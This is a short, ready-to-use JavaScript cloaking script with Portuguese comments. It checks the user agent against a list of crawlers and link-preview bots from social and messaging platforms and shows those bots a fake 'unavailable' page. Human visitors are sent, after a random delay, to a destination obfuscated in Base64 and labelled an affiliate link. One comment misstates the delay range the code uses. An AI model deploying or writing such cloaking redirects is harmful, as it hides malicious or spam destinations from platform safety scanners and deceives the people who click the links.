<script>
(function () {
  const userAgent = navigator.userAgent.toLowerCase();

  // Lista de bots e crawlers conhecidos
  const botKeywords = [
    "bot","crawl","spider","facebook","twitter","slack",
    "discord","linkedin","preview","whatsapp","telegram",
    "pinterest","reddit","nuzzel","skype","google","bitlybot",
    "vk","quora","yahoo","bing","outlook","teams"
  ];

  // Bloqueia bots
  for (let i = 0; i < botKeywords.length; i++) {
    if (userAgent.includes(botKeywords[i])) {
      document.body.innerHTML = "<h1>Conteúdo temporariamente indisponível.</h1>";
      return;
    }
  }

  // Link de afiliado codificado em Base64 (URL-safe)
  const encoded = "aHR0cHM6Ly9iZ2ZmZmlnLmh1YmZsb3dzbS5jb20vcy82M2QwMGUyNDBmY2Q1P3N1YnNvdXJjZT1RdWlja0ZXQg";

  // Função de decode segura
  function decodeBase64(str) {
    try {
      return decodeURIComponent(escape(window.atob(str)));
    } catch (e) {
      return "";
    }
  }

  const destination = decodeBase64(encoded);

  // Delay aleatório entre 500 e 900 ms
  const delay = Math.floor(Math.random() * (800 - 500 + 1)) + 500;

  // Redireciona
  setTimeout(() => {
    if (destination) {
      window.location.replace(destination);
    } else {
      document.body.innerHTML = "<h1>Erro ao carregar conteúdo.</h1>";
    }
  }, delay);
})();
</script>
